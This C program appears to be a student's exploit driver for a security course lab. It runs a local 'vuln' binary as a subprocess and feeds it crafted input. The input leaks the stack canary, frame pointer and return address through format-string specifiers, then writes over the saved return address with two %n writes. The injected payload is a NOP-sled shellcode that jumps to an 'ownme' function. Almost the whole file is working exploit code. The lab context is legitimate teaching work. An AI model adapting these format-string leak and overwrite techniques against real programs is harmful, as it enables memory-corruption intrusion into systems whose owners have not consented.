#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i])) {
         if (buf[i] == '\\')
            fputc(buf[i], stderr);
         fputc(buf[i], stderr);
      }
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
   fprintf(stderr, "[%d]", len);
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   getchar();
   /*
   // print something from the stack
   put_str("e %x %x %x\n");
   send();

   // extract something (e.g., the second element) from output 
   int i;
   get_formatted("%*x%x%*x", &i);
   fprintf(stderr, "driver: Extracted %x\n", i);

   // Now, do more things, e.g., prepare a stack smashing payload
   put_str("p xyz\x08\x04\x9a\x9f\Z \\x08\\x04\n");
   send();
   put_str("u aaaaaaaaaaaaaaaaaaa");
   send();

   put_str("l \n");
   send();
   */

   put_str("e %631$x %634$x %635$x\n");
   send();

   // Once all of the above information has been populated, you are ready to run
   // the exploit.

   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra);
   fprintf(stderr, "driver: Extracted canary=%x, bp=%x, ra=%x\n", 
           cur_canary, cur_mainloop_bp, cur_mainloop_ra);
   unsigned eip_to_overwrite = cur_mainloop_bp - 48 + 4;
   unsigned eip_part_two = eip_to_overwrite + 2;
   unsigned rdbuf_addr = cur_mainloop_bp - 1976 + 4 + 25; // NIRVIK : MAKE CHANGE
   //unsigned own_me_add = 0x804b214; //0x80488a0 ; //;
   unsigned own_me_add = rdbuf_addr; 
   fprintf(stderr, "driver: EIP to overwrite=%x\n", eip_to_overwrite); 
   fprintf(stderr, "driver: OwnMe to write=%x\n", own_me_add); 

	
   //put_str("e AAAAA \x8c\xef\xff\xbf BBBBB %154$x \n");
   unsigned explsz = sizeof(int);


   void **expl = (void**)malloc(explsz);
   void **expl2 = (void **)malloc(sizeof(int));
   void **attack_str = (void **)malloc(400);


   expl[0/sizeof(void *)] = (void *)eip_to_overwrite;
   expl2[0/sizeof(void *)] = (void *)eip_part_two;
	
   // this is the exploit string that needs to get added  90909090 8b8538f8 ffff9090 90909090 909050c3 <ownme_addr>
   // memcpy(expl, "\x90\x90\x90\x90\x8b\x85\x38\xf8\xff\xff\x90\x90\x90\x90\x90\x90\x50\xc3",  20);
   // expl[13] = (void*) (cur_mainloop_ra - mainloop_ownme_diff);]

   memcpy(attack_str, "\x90\x90\x90\x90\x8b\x85\x79\xf8\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x50\xc3",  20);
   int mainloop_ownme_diff = 1141;
   
   attack_str[5] = (void *) (cur_mainloop_ra - mainloop_ownme_diff); // this will produce ownme's address
   
   
   // First part
   char *expl3 = (char *)malloc(100);
   int first_byte = own_me_add & 0x0000ffff;
   printf("The first byte %x \n", first_byte);
   //snprintf(expl3, 20, "%s", "%154$x%154$n"); have to write %154$137$n
   snprintf(expl3, 100, "%s%d%s%s", "%154$", first_byte-10, "x%154$n", (char *)attack_str);
   put_str("e AAAAA ");
   put_bin((char *)expl, sizeof(int));  // eip to overwrite
   put_bin(expl3, 100); // overwrite the address
   //put_bin((char *)attack_str, 20); // injected code
   put_str("\n");
   send();
   //usleep(1000000);


   // Second part
   //usleep(1000000);
   char *expl4 = (char *)malloc(100); //60
   int second_byte = (own_me_add & 0xffff0000) >> 16;
   eip_to_overwrite += 2;
   expl[0/sizeof(void *)] = (void *)(eip_to_overwrite);
   printf("The second byte %x \n", second_byte);
   snprintf(expl4, 100, "%s%d%s%s", "%154$", second_byte-10, "x%154$n", (char *)attack_str);
   put_str("e AAAAA ");
   put_bin((char *)expl, sizeof(int));
   put_bin(expl4, 100);
   put_str("\n");
   send();

   //usleep(1000000);


   put_str("q \n");
   send();

   get_formatted("%*s");
   usleep(1000000);
   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   } 
}
